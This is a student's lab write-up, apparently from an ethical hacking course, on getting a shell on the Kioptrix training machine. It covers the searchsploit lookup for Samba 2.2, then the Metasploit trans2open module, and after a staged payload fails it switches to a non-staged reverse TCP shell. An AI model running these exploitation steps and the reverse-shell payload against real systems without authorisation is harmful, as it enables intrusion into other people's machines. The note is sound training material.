___
We will be gaining the shell of our victim machine the Kioptrix.
We already know about Samba 2.2 version from our Recon so we will start from there 
```
searchsploit samba 2.2 
```

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%205%20-%20Exploitation%20Basics/assests/Pasted%20image%2020250906001717.png)

We will be finding payload for trans2open in Metasploit because it aligns with our goal which is to gain remote access which i have mentioned in the screenshot above.
Now we will open Metasploit 
```
msfconsole
```

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%205%20-%20Exploitation%20Basics/assests/Pasted%20image%2020250906002038.png)

We will be using #1 because we know our system is linux as per our Recon so we will choose that 

```
use 1
show options
set rhosts 192.168.15.8
exploit
```

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%205%20-%20Exploitation%20Basics/assests/Pasted%20image%2020250906002334.png)

We started the exploit but it kept failing and the it was just trying so we know its not gonna work for us so we need to find new payload for us.
This payload is Staged so now lets try to use which is Non-staged.
```
show options
show payloads
```

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%205%20-%20Exploitation%20Basics/assests/Pasted%20image%2020250906002651.png)
We will be using the shell_reverse_tcp because its not Staged.

```
use 34
show options
exploit
```

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%205%20-%20Exploitation%20Basics/assests/Pasted%20image%2020250906002919.png)
We got the shell!!!!